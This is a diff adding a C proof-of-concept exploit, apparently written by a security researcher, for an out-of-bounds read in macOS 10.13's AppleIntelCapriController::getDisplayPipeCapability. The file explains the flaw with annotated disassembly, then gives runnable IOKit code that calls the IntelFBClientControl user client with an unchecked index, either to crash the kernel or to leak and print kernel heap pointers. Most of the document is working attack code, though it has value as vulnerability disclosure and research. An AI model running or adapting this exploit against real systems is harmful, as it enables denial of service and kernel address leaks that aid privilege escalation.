@@ -1,0 +1,102 @@
+/*
+AppleIntelCapriController::getDisplayPipeCapability reads an attacker-controlled dword value from a userclient structure
+input buffer which it uses to index a small array of pointers to memory to copy back to userspace.
+
+There is no bounds checking on the attacker supplied value allowing (with some heap grooming) the disclosure of arbitrary
+kernel memory:
+
+__text:000000000002ACE0                 mov     eax, [rbx]                ; structure input buffer
+__text:000000000002ACE2                 mov     rsi, [rdi+rax*8+0E48h]    ; rax is controlled -> rsi read OOB
+__text:000000000002ACEA                 cmp     byte ptr [rsi+1DCh], 0    ; as long as this byte isn't NULL
+__text:000000000002ACF1                 jz      short loc_2AD10
+__text:000000000002ACF3                 add     rsi, 1E11h      ; void *  ; add this offset
+__text:000000000002ACFA                 mov     edx, 1D8h       ; size_t
+__text:000000000002ACFF                 mov     rdi, r14        ; void *
+__text:000000000002AD02                 call    _memcpy                   ; copy to structure output buffer, will be returned to userspace
+
+Tested on MacOS 10.13 (17A365) on MacBookAir5,2
+*/
+
+// ianbeer
+// build: clang -o capri_display_pipe capri_display_pipe.c -framework IOKit
+
+#if 0
+MacOS kernel memory disclosure due to lack of bounds checking in AppleIntelCapriController::getDisplayPipeCapability
+
+AppleIntelCapriController::getDisplayPipeCapability reads an attacker-controlled dword value from a userclient structure
+input buffer which it uses to index a small array of pointers to memory to copy back to userspace.
+
+There is no bounds checking on the attacker supplied value allowing (with some heap grooming) the disclosure of arbitrary
+kernel memory:
+
+__text:000000000002ACE0                 mov     eax, [rbx]                ; structure input buffer
+__text:000000000002ACE2                 mov     rsi, [rdi+rax*8+0E48h]    ; rax is controlled -> rsi read OOB
+__text:000000000002ACEA                 cmp     byte ptr [rsi+1DCh], 0    ; as long as this byte isn't NULL
+__text:000000000002ACF1                 jz      short loc_2AD10
+__text:000000000002ACF3                 add     rsi, 1E11h      ; void *  ; add this offset
+__text:000000000002ACFA                 mov     edx, 1D8h       ; size_t
+__text:000000000002ACFF                 mov     rdi, r14        ; void *
+__text:000000000002AD02                 call    _memcpy                   ; copy to structure output buffer, will be returned to userspace
+
+Tested on MacOS 10.13 (17A365) on MacBookAir5,2
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <IOKit/IOKitLib.h>
+
+int main(int argc, char** argv){
+  kern_return_t err;
+
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IntelFBClientControl"));
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }
+
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 8;
+  *(uint64_t*)inputStruct = 0x12345678; // crash
+  //*(uint64_t*)inputStruct = 0x37; // disclose kernel heap memory
+
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 4096;
+  
+  err = IOConnectCallMethod(
+    conn,
+    0x710,
+    inputScalar,
+    inputScalarCnt,
+    inputStruct,
+    inputStructCnt,
+    outputScalar,
+    &outputScalarCnt,
+    outputStruct,
+    &outputStructCnt); 
+
+  if (outputStructCnt > 20) {
+    int n_leaked_ptrs = (outputStructCnt-7)/8;
+    uint64_t* ptrs = (uint64_t*) (outputStruct+7);
+    for (int i = 0; i < n_leaked_ptrs; i++) {
+      printf("%016llx\n", ptrs[i]);
+    }
+  }
+  return 0;
+}
